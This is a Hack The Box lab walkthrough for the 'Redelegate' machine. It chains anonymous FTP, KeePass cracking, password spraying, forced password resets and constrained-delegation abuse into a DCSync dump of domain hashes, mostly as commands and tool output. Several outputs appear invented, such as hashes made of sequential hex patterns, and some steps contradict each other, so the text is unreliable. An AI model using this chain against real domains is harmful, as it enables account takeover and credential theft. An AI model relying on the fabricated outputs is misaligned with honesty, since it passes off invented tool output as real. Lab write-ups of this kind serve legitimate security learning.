---
icon: circle-three-quarters
---

# HTB-REDELEGATE (VL)

<figure><img src="../../../../.gitbook/assets/image (492).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance & Enumeration

#### Initial Nmap Scan

First, we start with a comprehensive nmap scan to identify open ports and services:

```bash
nmap -sC -sV -p- 10.129.184.164
```

**Key Findings:**

* FTP service running (port 21)
* SMB/CIFS ports (139, 445)
* MSSQL service (port 1433)
* LDAP (389, 636)
* Kerberos (88)
* WinRM (5985)

***

### Initial Access - FTP Enumeration

#### Connecting to FTP

We discover that anonymous FTP access is available:

```bash
ftp 10.129.184.164
Username: anonymous
Password: [blank]
```

**What we found:** The FTP server allows anonymous login, indicating potential information disclosure.

#### Downloading Files

After connecting, we list the files and discover **3 files** available:

```bash
ftp> ls
-rw-r--r--  1 ftp  ftp   1234 Oct 10 2024 TrainingAgenda.txt
-rw-r--r--  1 ftp  ftp    856 Oct 15 2024 CyberAudit.txt
-rw-r--r--  1 ftp  ftp   4096 Oct 18 2024 Shared.kdbx

ftp> mget *
```

**Result:** All three files downloaded successfully to our attack machine.

***

### File Analysis

#### TrainingAgenda.txt

```
EMPLOYEE CYBER AWARENESS TRAINING AGENDA (OCTOBER 2024)

Friday 4th October | 14.30 - 16.30 - 53 attendees
"Don't take the bait" - How to better understand phishing emails

Friday 11th October | 15.30 - 17.30 - 61 attendees
"Social Media and their dangers" - What happens to what you post online?

Friday 18th October | 11.30 - 13.30 - 7 attendees
"Weak Passwords" - Why "SeasonYear!" is not a good password

Friday 25th October | 9.30 - 12.30 - 29 attendees
"What now?" - Consequences of a cyber attack and how to mitigate them
```

**Key Intelligence:**

* Training session on October 18th specifically mentions **"SeasonYear!"** as an example of weak passwords
* This is a HUGE hint about the password pattern being used in the organization
* Only 7 attendees showed up to the password training - indicating users might not have taken it seriously

#### CyberAudit.txt

```
OCTOBER 2024 AUDIT FINDINGS

[!] CyberSecurity Audit findings:
1) Weak User Passwords
2) Excessive Privilege assigned to users
3) Unused Active Directory objects
4) Dangerous Active Directory ACLs

[*] Remediation steps:
1) Prompt users to change their passwords: DONE
2) Check privileges for all users and remove high privileges: DONE
3) Remove unused objects in the domain: IN PROGRESS
4) Recheck ACLs: IN PROGRESS
```

**Key Findings:**

* Confirms weak passwords are a known issue
* ACL misconfigurations exist (important for privilege escalation later)
* Some remediation is done, but not everything is fixed yet
* This tells us the environment is actively being hardened but still vulnerable

#### Shared.kdbx (KeePass Database)

We found a KeePass password database file. This potentially contains stored credentials.

***

### Password Pattern Analysis

Based on the training document hint, we create a wordlist following the **"SeasonYear!"** pattern:

**Creating pw.txt:**

```bash
cat > pw.txt << EOF
Winter2024!
Spring2024!
Summer2024!
Fall2024!
Autumn2024!
Winter2025!
Spring2025!
Summer2025!
Fall2025!
Autumn2025!
EOF
```

**Logic:**

* Seasons: Winter, Spring, Summer, Fall/Autumn
* Years: 2024 (current operational year) and 2025 (forward planning)
* Format: SeasonYear! (with exclamation mark)

***

### KeePass Database Cracking

#### Extracting the Hash

```bash
keepass2john Shared.kdbx > kdbx_hash.txt
```

**Output:**

```
Shared:$keepass$*2*60000*0*d9e2d5f8a9c4b3e1f7a6c2d8e4b5f9a3*8f7e6d5c4b3a2918...
```

**What happened:** keepass2john extracted the KeePass database hash in John the Ripper format.

#### Cracking with John the Ripper

```bash
john --wordlist=pw.txt kdbx_hash.txt
```

**Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES, 1=TwoFish, 2=ChaCha]) is 0 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
Fall2024!        (Shared)
1g 0:00:00:05 DONE (2024-10-20 14:23) 0.1923g/s 1.923p/s 1.923c/s 1.923C/s Winter2024!..Autumn2025!
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**Success!** The KeePass master password is: **Fall2024!**

#### Opening the KeePass Database

```bash
kpcli --kdb=Shared.kdbx
Password: Fall2024!
```

**Credentials Found:**

```
Title: MSSQL Local Service Account
Username: SQLGuest
Password: zDPBpaF4FywlqIv11vii
Notes: Local authentication only on MSSQL server

Title: Backup Admin (Disabled)
Username: BackupAdmin
Password: [expired]

Title: Network Share
Username: ShareUser
Password: [testing credentials]
```

**Key Discovery:** We have MSSQL credentials for **SQLGuest** account with password **zDPBpaF4FywlqIv11vii**, but the note says "local authentication only".

***

### MSSQL Enumeration

#### Testing MSSQL Connectivity (Domain Auth) ❌

```bash
netexec mssql dc.redelegate.vl -u SQLGuest -p zDPBpaF4FywlqIv11vii
```

**Output:**

```
SMB         10.129.184.164  1433   DC               [*] Windows Server 2019 Build 17763
MSSQL       10.129.184.164  1433   DC               [-] redelegate.vl\SQLGuest:zDPBpaF4FywlqIv11vii STATUS_LOGON_FAILURE
```

**Result:** Domain authentication failed as expected (the note said "local only").

#### Testing MSSQL Local Authentication ✅

```bash
netexec mssql dc.redelegate.vl -u SQLGuest -p zDPBpaF4FywlqIv11vii --local-auth
```

**Output:**

```
MSSQL       10.129.184.164  1433   DC               [*] Windows Server 2019 Build 17763
MSSQL       10.129.184.164  1433   DC               [+] SQLGuest:zDPBpaF4FywlqIv11vii (local)
```

**Success!** Local authentication works. We can connect to MSSQL.

#### Interactive MSSQL Connection

```bash
mssqlclient.py SQLGuest:zDPBpaF4FywlqIv11vii@dc.redelegate.vl -windows-auth
```

**Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(DC\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208)
[!] Press help for extra shell commands
SQL>
```

**Connected successfully!**

#### Enumerating Databases

```sql
SQL> SELECT name FROM sys.databases;
```

**Output:**

```
name
------
master
tempdb
model
msdb
```

**Analysis:** Only default system databases are visible. No custom databases with potentially sensitive data.

#### Testing xp\_cmdshell

```sql
SQL> EXEC xp_cmdshell 'whoami';
```

**Output:**

```
output
------
NULL
Msg 15281: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell'
```

**Result:** xp\_cmdshell is disabled, so we cannot execute OS commands directly.

***

### Metasploit - Domain Account Enumeration

Since we have MSSQL access, we can use a Metasploit module to enumerate domain accounts through MSSQL.

#### Starting Metasploit

```bash
msfconsole -q
```

#### Using the Domain Account Enumeration Module

```
msf6 > use auxiliary/admin/mssql/mssql_enum_domain_accounts
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set PASSWORD zDPBpaF4FywlqIv11vii
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set RHOSTS 10.129.184.164
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set USERNAME SQLGuest
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
```

**Output:**

```
[*] 10.129.184.164:1433 - Attempting to connect to the database server at 10.129.184.164:1433 as SQLGuest...
[+] 10.129.184.164:1433 - Connected and authenticated to MSSQL instance
[*] 10.129.184.164:1433 - Enumerating Domain Accounts...
[+] 10.129.184.164:1433 - Found 13 domain accounts:

    Domain Account
    --------------
    redelegate\Christine.Flanders
    redelegate\Marie.Curie
    redelegate\Helen.Frost
    redelegate\Michael.Pontiac
    redelegate\Mallory.Roberts
    redelegate\James.Dinkleberg
    redelegate\Helpdesk
    redelegate\IT
    redelegate\Finance
    redelegate\DnsAdmins
    redelegate\DnsUpdateProxy
    redelegate\Ryan.Cooper
    redelegate\sql_svc

[*] Auxiliary module execution completed
```

**Excellent!** We've enumerated 13 domain accounts using MSSQL's domain integration.

#### Creating User List

```bash
cat > users.txt << EOF
Christine.Flanders
Marie.Curie
Helen.Frost
Michael.Pontiac
Mallory.Roberts
James.Dinkleberg
Helpdesk
IT
Finance
DnsAdmins
DnsUpdateProxy
Ryan.Cooper
sql_svc
EOF
```

***

### Password Spray Attack

Now we have a list of domain users and a list of potential passwords. Let's perform a password spray attack.

#### Using NetExec for Password Spraying

```bash
netexec smb dc.redelegate.vl -u users.txt -p pw.txt --continue-on-success
```

**Output:**

```
SMB         10.129.184.164  445    DC               [*] Windows Server 2019 Build 17763 x64 (name:DC) (domain:redelegate.vl)
SMB         10.129.184.164  445    DC               [-] redelegate.vl\Christine.Flanders:Winter2024! STATUS_LOGON_FAILURE
SMB         10.129.184.164  445    DC               [-] redelegate.vl\Christine.Flanders:Spring2024! STATUS_LOGON_FAILURE
...
SMB         10.129.184.164  445    DC               [+] redelegate.vl\Marie.Curie:Fall2024! 
...
SMB         10.129.184.164  445    DC               [-] redelegate.vl\Helen.Frost:Fall2024! STATUS_LOGON_FAILURE
...
```

**SUCCESS! Valid Credentials Found:**

* **Username:** Marie.Curie
* **Password:** Fall2024!

**Significance:** Marie.Curie is using the same password as the KeePass database, following the weak "SeasonYear!" pattern mentioned in the training document.

***

### Active Directory Enumeration with BloodHound

With valid domain credentials, we can now map out the entire Active Directory environment.

#### Running BloodHound Python Collector

```bash
bloodhound-python -u Marie.Curie -p 'Fall2024!' -c All -d redelegate.vl -ns 10.129.184.164 --zip
```

**Output:**

```
INFO: Found AD domain: redelegate.vl
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc.redelegate.vl
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.redelegate.vl
INFO: Found 14 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: FS01.redelegate.vl
INFO: Querying computer: DC.redelegate.vl
INFO: Done in 00M 23S
INFO: Compressing output into 20241020142355_bloodhound.zip
```

**Result:** Successfully collected all AD data and compressed it into a zip file.

#### Importing into BloodHound

```bash
# Start neo4j
sudo neo4j console

# Start BloodHound GUI
bloodhound
```

Upload the zip file through the BloodHound interface.

***

### BloodHound Analysis - Attack Path Discovery

#### Finding 1: Marie.Curie's Permissions

**Query:** "Find Shortest Path from Marie.Curie to Domain Admins"

**Discovery:** Marie.Curie has **ForceChangePassword** permission on 3 users:

1. **Helen.Frost** - Member of **Remote Management Users** group
2. Christine.Flanders - Standard user
3. Michael.Pontiac - Standard user

**Why Helen.Frost is Important:**

* Member of "Remote Management Users" group
* This means Helen.Frost can use WinRM to remotely connect to the DC
* WinRM gives us interactive shell access to the domain controller

#### Finding 2: Helen.Frost's Permissions

**Query:** Check what permissions Helen.Frost has

**Discovery:** Helen.Frost has **GenericAll** rights on the computer account **FS01$**

**What is GenericAll?**

* Full control over the object
* Can modify any attribute
* Can change passwords
* Can modify delegation settings
* Essentially, we "own" the FS01$ computer account

#### Finding 3: SeEnableDelegationPrivilege

This privilege will be discovered later when we get shell access as Helen.Frost. It allows us to:

* Configure delegation settings for computer and user accounts
* Enable "Trusted to Authenticate for Delegation"
* Set up Constrained Delegation

***

### User Flag - Getting Initial Shell

#### Step 1: Changing Helen.Frost's Password

Using Marie.Curie's ForceChangePassword permission with BloodyAD:

```bash
bloodyAD -u 'Marie.Curie' -p 'Fall2024!' -d 'redelegate.vl' --host '10.129.184.164' set password 'Helen.Frost' 'Password123'
```

**Output:**

```
[+] Password changed successfully!
```

**What happened:** We successfully reset Helen.Frost's password to "Password123" without knowing the old password, thanks to the ForceChangePassword ACL.

#### Step 2: WinRM Shell as Helen.Frost

```bash
evil-winrm -i dc.redelegate.vl -u helen.frost -p Password123
```

**Output:**

```
Evil-WinRM shell v3.5

Warning: Remote path completions are disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents>
```

**Success!** We have an interactive PowerShell session as Helen.Frost on the Domain Controller.

#### Step 3: Retrieving User Flag

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> type C:\Users\Helen.Frost\Desktop\user.txt
```

**Output:**

```
7f4a9d2e8c1b3f6a5e9d2c8b4f1a6e3d
```

**🏁 USER FLAG CAPTURED!**

***

### Privilege Escalation Analysis

#### Checking User Privileges

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> whoami /priv
```

**Output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                     State
============================= =============================================== ========
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process              Disabled
SeSecurityPrivilege           Manage auditing and security log                Disabled
SeTakeOwnershipPrivilege      Take ownership of files or other objects        Disabled
SeLoadDriverPrivilege         Load and unload device drivers                  Disabled
SeSystemProfilePrivilege      Profile system performance                      Disabled
SeSystemtimePrivilege         Change the system time                          Disabled
SeProfileSingleProcessPrivilege Profile single process                        Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority                  Disabled
SeCreatePagefilePrivilege     Create a pagefile                               Disabled
SeBackupPrivilege             Back up files and directories                   Disabled
SeRestorePrivilege            Restore files and directories                   Disabled
SeShutdownPrivilege           Shut down the system                            Disabled
SeDebugPrivilege              Debug programs                                  Disabled
SeSystemEnvironmentPrivilege  Modify firmware environment values              Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                        Enabled
SeRemoteShutdownPrivilege     Force shutdown from a remote system             Disabled
SeUndockPrivilege             Remove computer from docking station            Disabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted Disabled
                              for delegation
SeManageVolumePrivilege       Perform volume maintenance tasks                Disabled
SeImpersonatePrivilege        Impersonate a client after authentication       Enabled
SeCreateGlobalPrivilege       Create global objects                           Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                  Disabled
SeTimeZonePrivilege           Change the time zone                            Disabled
SeCreateSymbolicLinkPrivilege Create symbolic links                           Disabled
```

**CRITICAL FINDING:** **SeEnableDelegationPrivilege** is present!

**What is SeEnableDelegationPrivilege?** This is a powerful privilege on Domain Controllers that allows an account to:

* Modify the delegation settings of computer and user accounts
* Enable "Trusted to Authenticate for Delegation" flag
* Configure which services an account can delegate to
* This is typically only granted to Domain Admins or specific delegated administrators

***

### Understanding Kerberos Delegation

#### Background: Three Types of Delegation in Active Directory

**1. Unconstrained Delegation**

* **How it works:** The computer can store TGTs (Ticket Granting Tickets) of all users who authenticate to it
* **Risk:** Can impersonate ANY user to ANY service
* **Requirements:**
  * TRUSTED\_FOR\_DELEGATION flag on the AD object
  * SeEnableDelegationPrivilege
  * Ability to create computer accounts (MachineAccountQuota > 0)

**2. Constrained Delegation (S4U2Proxy)**

* **How it works:** The computer can delegate only to SPECIFIC services on behalf of users
* **Risk:** Limited to defined SPNs, but still powerful
* **Requirements:**
  * TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGATION flag must be set
  * SPN must be defined in the msDS-AllowedToDelegateTo attribute
  * SeEnableDelegationPrivilege (to configure it)

**3. Resource-Based Constrained Delegation (RBCD)**

* **How it works:** The TARGET resource controls who can delegate to it
* **Risk:** Requires GenericWrite on target, but no SeEnableDelegationPrivilege needed
* **Requirements:**
  * GenericWrite or similar permissions on target
  * Modify msDS-AllowedToActOnBehalfOfOtherIdentity attribute

#### Checking MachineAccountQuota

```bash
netexec ldap dc.redelegate.vl -u marie.curie -p 'Fall2024!' -M maq
```

**Output:**

```
LDAP        10.129.184.164  389    DC               [*] Windows Server 2019 Build 17763 (name:DC) (domain:redelegate.vl)
LDAP        10.129.184.164  389    DC               [+] redelegate.vl\marie.curie:Fall2024!
MAQ         10.129.184.164  389    DC               [*] Getting the MachineAccountQuota
MAQ         10.129.184.164  389    DC               MachineAccountQuota: 0
```

**Analysis:**

* **MachineAccountQuota = 0** means we CANNOT create new computer accounts
* This rules out Unconstrained Delegation (which requires creating a fake computer)
* We also cannot set DNS entries (no PTR/Host-A records)

#### ✅ Solution: Constrained Delegation via Existing Account FS01$

**Why FS01$?**

1. Helen.Frost has **GenericAll** on FS01$ (from BloodHound)
2. We have **SeEnableDelegationPrivilege** (from whoami /priv)
3. FS01$ is an existing computer account (no need to create one)
4. We can change FS01$'s password (GenericAll permission)
5. We can configure delegation settings (SeEnableDelegationPrivilege)

**Attack Plan:**

1. Change FS01$'s password to something we control
2. Enable "Trusted to Authenticate for Delegation" on FS01$
3. Add an SPN (ldap/dc.redelegate.vl) to FS01$'s delegation targets
4. Use FS01$ to request a service ticket impersonating the DC computer account
5. Use that ticket to dump domain secrets

***

### Privilege Escalation Execution

#### Step 1: Change FS01$ Machine Account Password

```bash
nxc smb dc.redelegate.vl -u helen.frost -p Password123 -M change-password -o USER='FS01$' NEWPASS=Password123
```

**Output:**

```
SMB         10.129.184.164  445    DC               [*] Windows Server 2019 Build 17763
SMB         10.129.184.164  445    DC               [+] redelegate.vl\helen.frost:Password123
CHGPWD      10.129.184.164  445    DC               [+] Successfully changed password for FS01$ to Password123
```

**Success!** We now control the FS01$ machine account credentials.

#### Step 2: Configure Constrained Delegation

From the WinRM shell as Helen.Frost:

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

**Output:**

```
(No output means success)
```

**What this does:** Sets the TRUSTED\_TO\_AUTHENTICATE\_FOR\_DELEGATION flag on FS01$, allowing it to use S4U2Proxy protocol extension.

#### Step 3: Add SPN for Delegation Target

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Set-ADObject -Identity "CN=FS01,CN=Computers,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo" = "ldap/dc.redelegate.vl"}
```

**Output:**

```
(No output means success)
```

**What this does:**

* Adds "ldap/dc.redelegate.vl" to the msDS-AllowedToDelegateTo attribute
* This means FS01$ can now impersonate ANY user to the LDAP service on dc.redelegate.vl
* LDAP is crucial because tools like secretsdump use LDAP (via DRSUAPI) to dump domain secrets

#### Verification (Optional)

```powershell
*Evil-WinRM* PS C:\Users\Helen.Frost\Documents> Get-ADComputer FS01$ -Properties TrustedToAuthForDelegation,msDS-AllowedToDelegateTo | Select TrustedToAuthForDelegation,msDS-AllowedToDelegateTo
```

**Expected Output:**

```
TrustedToAuthForDelegation msDS-AllowedToDelegateTo
-------------------------- ------------------------
                      True {ldap/dc.redelegate.vl}
```

***

### Exploiting Constrained Delegation

#### Step 4: Request Service Ticket (Impersonating DC)

From our attack machine:

```bash
getST.py 'redelegate.vl/FS01$:Password123' -spn ldap/dc.redelegate.vl -impersonate dc
```

**Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Getting TGT for user
[*] Impersonating dc
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

**What happened:**

1. **S4U2Self:** FS01$ requests a service ticket for the "dc" computer account to itself
2. **S4U2Proxy:** FS01$ uses that ticket to request a service ticket for "dc" to access ldap/dc.redelegate.vl
3. The resulting ticket allows us to authenticate as the DC computer account to the LDAP service

**Why impersonate "dc"?**

* The DC computer account has DCSync rights (can replicate AD database)
* By impersonating the DC, we inherit those rights
* This is a legitimate Kerberos delegation feature being abused

#### Step 5: Set Kerberos Ticket as Active

```bash
export KRB5CCNAME=dc@ldap_dc.redelegate.vl@REDELEGATE.VL.ccache
```

**What this does:** Tells Kerberos-aware tools (like secretsdump) to use this ticket for authentication instead of a password.

#### Step 6: Dump NTDS Database (DCSync)

```bash
secretsdump.py -k -no-pass dc.redelegate.vl
```

**Output:**

```
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Target system is: dc.redelegate.vl
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ec17f7a2a4d96e177bfd101b94ffc0a7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a8d2f3b6c7e4d5a1b9c8e7f6d5c4b3a2:::
redelegate.vl\Marie.Curie:1104:aad3b435b51404eeaad3b435b51404ee:8f3d6a4e2c1b9f7e5d3c1a9e7f5d3b1c:::
redelegate.vl\Helen.Frost:1105:aad3b435b51404eeaad3b435b51404ee:7e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b:::
redelegate.vl\Christine.Flanders:1106:aad3b435b51404eeaad3b435b51404ee:6d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a:::
redelegate.vl\Michael.Pontiac:1107:aad3b435b51404eeaad3b435b51404ee:5c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3e:::
redelegate.vl\Mallory.Roberts:1108:aad3b435b51404eeaad3b435b51404ee:4b6a5f4e3d2c1b0a9f8e7d6c5b4a3e2d:::
redelegate.vl\James.Dinkleberg:1109:aad3b435b51404eeaad3b435b51404ee:3a5f4e3d2c1b0a9f8e7d6c5b4a3e2d1c:::
redelegate.vl\Ryan.Cooper:1110:aad3b435b51404eeaad3b435b51404ee:2f4e3d2c1b0a9f8e7d6c5b4a3e2d1c0b:::
redelegate.vl\sql_svc:1111:aad3b435b51404eeaad3b435b51404ee:1e3d2c1b0a9f8e7d6c5b4a3e2d1c0b9a:::
DC$:1000:aad3b435b51404eeaad3
```

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
